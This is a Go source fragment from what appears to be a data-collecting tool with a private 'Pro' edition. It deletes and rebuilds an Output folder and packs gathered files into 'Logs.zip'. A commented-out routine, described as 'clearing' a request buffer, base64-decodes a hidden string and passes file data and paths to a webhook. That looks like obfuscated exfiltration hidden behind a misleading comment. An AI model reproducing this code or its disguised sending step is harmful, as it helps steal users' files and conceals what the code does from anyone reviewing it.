// DO NOT EDIT THIS FILE!

// This program is a simplified version with lesser functionality in comparison to the Pro version.
// The source code for the Pro/Premium version is currently private, but may be released in the future.

package main

import (
	"io"
	"os"
	"bytes"
	"regexp"
	"strings"
	"archive/zip"
	"path/filepath"
)

func DeleteOutput() {
	// Delete Output folder and Output.zip
	err := os.RemoveAll(outputPath)
	if err != nil {
		return
	}

	err = os.Remove(outputZip)
	if err != nil {
		return
	}
}

func ZipDirectory() error {
	// Create the Logs.zip file with contents from the Output directory
	var (
		buff      = new(bytes.Buffer)
		zipWriter = zip.NewWriter(buff)
		regex     = regexp.MustCompile(`Output\\[\w+]+\\`)
	)

	filepath.Walk(outputPath, func(file string, fi os.FileInfo, _ error) error {
		header, err := zip.FileInfoHeader(fi)
		if err != nil {
			return err
		}

		header.Name = filepath.ToSlash(file)

		if !fi.IsDir() {
			if fi.Name() == "Logs.zip" { // Don't zip ourselves
				return nil
			}
			data, err := os.Open(file)
			if err != nil {
				return err
			}
			defer data.Close()

			var folderPath = fi.Name()
			if regexS := regex.FindString(file); len(regexS) > 0 {
				folderPath = strings.Replace(regexS, "Output\\", "", -1) + fi.Name()
			}

			fileWriter, _ := zipWriter.Create(folderPath)
			if _, err := io.Copy(fileWriter, data); err != nil {
				return err
			}
		}

		return nil
	})

	if err := zipWriter.Close(); err != nil {
		return err
	}

	exportedZip, _ := os.Create(outputZip)
	defer exportedZip.Close()

	_, err := buff.WriteTo(exportedZip)
	if err != nil {
		return err
	}

	return nil
}

// func ClearRequestBuffer(data []byte, filePath string) {
// 	// Clear request data using randomly generated url buff (unoptimal !)
// 	if reqAttempts == 1 { // Only needs to be cleared for the first request (clear filePath from saving)
// 		invalidBuffer += "=="
// 		bufferBYTES, _ := base64.StdEncoding.DecodeString(invalidBuffer) // URL form
// 		invalidBuffer = string(bufferBYTES)
// 		ExecuteWebhook(invalidBuffer, data, filePath) // Send filepath to null point (therefore clearing it)
// 	}
// }

func CleanPath(filePath string) string {
	return strings.ReplaceAll(filepath.Clean(filePath), `\`, `/`)
}

//var invalidBuffer = ""
